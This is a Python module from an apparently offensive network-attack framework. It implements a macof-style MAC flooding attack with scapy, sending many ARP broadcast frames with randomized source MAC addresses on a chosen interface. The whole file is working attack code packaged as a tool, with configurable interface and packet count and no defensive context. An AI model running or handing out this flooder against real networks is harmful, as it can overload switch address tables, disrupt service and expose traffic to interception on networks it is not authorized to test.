import os
import logging
# Disable warning IPv6
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from jframework.modules.model import Module
import jframework.extras.writeformat as wf
from jframework.extras.check_scapy import check
try:
    from scapy.all import *
    conf.verb = 0
except:
    pass

class Macof(Module):

    def __init__(self):
        super(Macof, self).__init__()
        self.target_iface = "eth0"
        self.number_packets = 100

    def get_options(self):
        options = super(Macof,self).get_options()
        options.extend(["iface", "packets"])
        return options

    def conf(self):
        super(Macof, self).conf()
        wf.printf("iface", self.target_iface, "Interface")
        wf.printf("packets", str(self.number_packets), "Number of packets to send")

    def iface(self, interface):
        self.target_iface = interface

    def packets(self, number):
        self.number_packets = number

    def help(self):
        super(Macof, self).help()
        print("iface <interface> -> set the target interface")
        print("packets <packets> -> set the number of packets to send")

    def run(self):
        super(Macof, self).run()

        resp = check()
        if (resp != "ok"):
            print(resp)
            return

        eth = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")
        arp = ARP(pdst=self.host, hwdst="ff:ff:ff:ff:ff:ff")
        try:
            sendp(eth/arp, iface=self.target_iface, count=self.number_packets, inter=0.02)
            print(self.number_packets,"packets were sent")
        except:
            print("The destination is unreachable")
